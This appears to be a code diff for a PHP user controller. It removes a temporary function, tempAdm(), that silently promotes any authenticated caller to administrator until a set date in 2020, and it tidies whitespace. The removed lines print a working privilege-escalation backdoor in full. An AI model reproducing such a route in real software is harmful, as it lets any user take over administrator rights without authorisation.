@@ -32,27 +32,11 @@ class UserController extends Controller
 		}
 	}
 
-	/**
-	 * Link will die by the end of the month
-	 */
-	function tempAdm() {
-		$date = mktime(17, 59, 59, 7, 31, 2020);
-		if (strtotime('now') < $date) {
-			$user = User::findOrFail(auth()->id());
-			$user->is_admin = true;
-			$user->save();
-			return "authorized";
-		} else {
-			// If it's past this month, disable route
-			abort(404);
-		}
-	}
-
 	// Start CRUD users
 	function viewUsersData(Request $request) {
 		$model = User::viewUserBuilder()
 			->newQuery();
-			
+
 		return DataTables::eloquent($model)
 			->filterColumn('is_admin', function($query, $keyword) {
 				if ($keyword == "true") {
